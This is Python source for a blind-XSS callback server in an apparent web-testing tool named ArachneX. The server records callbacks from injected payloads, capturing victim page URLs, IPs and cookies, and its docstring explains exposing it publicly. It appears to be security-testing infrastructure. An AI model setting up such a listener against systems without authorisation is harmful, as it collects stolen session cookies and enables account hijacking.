"""
Blind-XSS collaborator server.

Listens for callbacks fired by blind payloads. The engine stores
correlation between probe_id and (Target, InjectionPoint, payload)
in a SQLite DB; this server *just* receives and records.

The server prints each callback live to the console with rich
formatting so the operator sees it land in real time.

Run with:
    arachnex blind --listen 0.0.0.0:8443 --domain xss.your-collab.com

Then expose port 8443 over TLS (Caddy / Nginx) and point your DNS A
record at the listener. ArachneX payloads will then beacon back to it.
"""

from __future__ import annotations

import json
import logging
import sqlite3
import time
from contextlib import asynccontextmanager
from pathlib import Path
from typing import Optional

try:
    from fastapi import FastAPI, Request, WebSocket, WebSocketDisconnect
    from fastapi.responses import Response
    import uvicorn
    _FASTAPI = True
except ImportError:                                              # pragma: no cover
    _FASTAPI = False

from arachnex.utils.logger import console

log = logging.getLogger("arachnex.collab")


_DB_DDL = """
CREATE TABLE IF NOT EXISTS callbacks (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    probe_id TEXT NOT NULL,
    ts_ms INTEGER NOT NULL,
    remote_ip TEXT,
    user_agent TEXT,
    referer TEXT,
    page_url TEXT,
    page_title TEXT,
    cookies TEXT,
    body TEXT,
    transport TEXT
);
CREATE INDEX IF NOT EXISTS ix_probe ON callbacks(probe_id);
"""

# 1x1 transparent GIF used by pixel-loader fallback path
_PIXEL_GIF = (
    b"GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04"
    b"\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;"
)


def _open_db(path: Path) -> sqlite3.Connection:
    path.parent.mkdir(parents=True, exist_ok=True)
    conn = sqlite3.connect(str(path))
    conn.executescript(_DB_DDL)
    return conn


def build_app(domain: str, db_path: Path) -> "FastAPI":
    if not _FASTAPI:
        raise RuntimeError("fastapi + uvicorn required for blind collab")

    db = _open_db(db_path)

    @asynccontextmanager
    async def lifespan(_app: "FastAPI"):
        log.info("collab listening for domain %s", domain)
        yield
        db.close()

    app = FastAPI(lifespan=lifespan, docs_url=None, redoc_url=None, openapi_url=None)

    # --------------------------- HTTP routes ----------------------------- #

    @app.api_route("/b/{probe_id}", methods=["GET", "POST"])
    async def http_beacon(probe_id: str, request: "Request") -> "Response":
        body_text = ""
        try:
            raw = await request.body()
            body_text = raw.decode("utf-8", errors="replace") if raw else ""
        except Exception:
            pass

        page_url = page_title = cookies = referer = ""
        try:
            parsed = json.loads(body_text) if body_text else {}
            if isinstance(parsed, dict):
                page_url   = str(parsed.get("u", ""))[:1024]
                page_title = str(parsed.get("t", ""))[:200]
                cookies    = str(parsed.get("c", ""))[:2048]
                referer    = str(parsed.get("r", ""))[:1024]
        except Exception:
            pass

        _record(
            db, probe_id=probe_id,
            remote_ip=_client_ip(request),
            user_agent=request.headers.get("user-agent", ""),
            referer=referer or request.headers.get("referer", ""),
            page_url=page_url, page_title=page_title,
            cookies=cookies, body=body_text[:4096],
            transport="http",
        )
        _print_live(probe_id, _client_ip(request), page_url or "(no js body)")
        return Response(content=_PIXEL_GIF, media_type="image/gif")

    @app.get("/b/{probe_id}/pix")
    async def pixel_fallback(probe_id: str, request: "Request") -> "Response":
        page_url = request.query_params.get("u", "")[:1024]
        _record(
            db, probe_id=probe_id,
            remote_ip=_client_ip(request),
            user_agent=request.headers.get("user-agent", ""),
            referer=request.headers.get("referer", ""),
            page_url=page_url, page_title="", cookies="", body="",
            transport="pixel",
        )
        _print_live(probe_id, _client_ip(request), page_url or "(pixel)")
        return Response(content=_PIXEL_GIF, media_type="image/gif")

    @app.websocket("/ws/{probe_id}")
    async def ws_beacon(websocket: "WebSocket", probe_id: str):
        await websocket.accept()
        ip = websocket.client.host if websocket.client else ""
        ua = websocket.headers.get("user-agent", "")
        try:
            while True:
                msg = await websocket.receive_text()
                _record(
                    db, probe_id=probe_id, remote_ip=ip, user_agent=ua,
                    referer="", page_url="", page_title="", cookies="",
                    body=msg[:4096], transport="websocket",
                )
                _print_live(probe_id, ip, "(ws msg)")
        except WebSocketDisconnect:
            return

    @app.get("/healthz")
    async def healthz() -> dict:
        return {"ok": True, "domain": domain}

    return app


# --------------------------------------------------------------------------- #
# Helpers
# --------------------------------------------------------------------------- #


def _client_ip(request: "Request") -> str:
    # Honour X-Forwarded-For when set by a trusted reverse proxy
    xff = request.headers.get("x-forwarded-for")
    if xff:
        return xff.split(",")[0].strip()
    return request.client.host if request.client else ""


def _record(db: sqlite3.Connection, **fields) -> None:
    fields.setdefault("ts_ms", int(time.time() * 1000))
    cols = ",".join(fields)
    placeholders = ",".join("?" for _ in fields)
    db.execute(
        f"INSERT INTO callbacks ({cols}) VALUES ({placeholders})",
        tuple(fields.values()),
    )
    db.commit()


def _print_live(probe_id: str, ip: str, summary: str) -> None:
    ts = time.strftime("%H:%M:%S")
    console.print(
        f"[green]✦[/green] [bold]{ts}[/bold] callback "
        f"[cyan]{probe_id}[/cyan] from [yellow]{ip}[/yellow] "
        f"[dim]{summary[:120]}[/dim]"
    )


def run_server(host: str, port: int, domain: str,
               db_path: Optional[Path] = None) -> None:
    if not _FASTAPI:
        raise RuntimeError("fastapi + uvicorn required for blind collab")
    db_path = db_path or Path("./arachnex-out/collab.sqlite3")
    app = build_app(domain=domain, db_path=db_path)
    console.print(f"[bold green]ArachneX collab[/bold green] · "
                  f"domain=[cyan]{domain}[/cyan] · "
                  f"db=[dim]{db_path}[/dim] · "
                  f"listening on [yellow]{host}:{port}[/yellow]")
    uvicorn.run(app, host=host, port=port, log_level="warning")
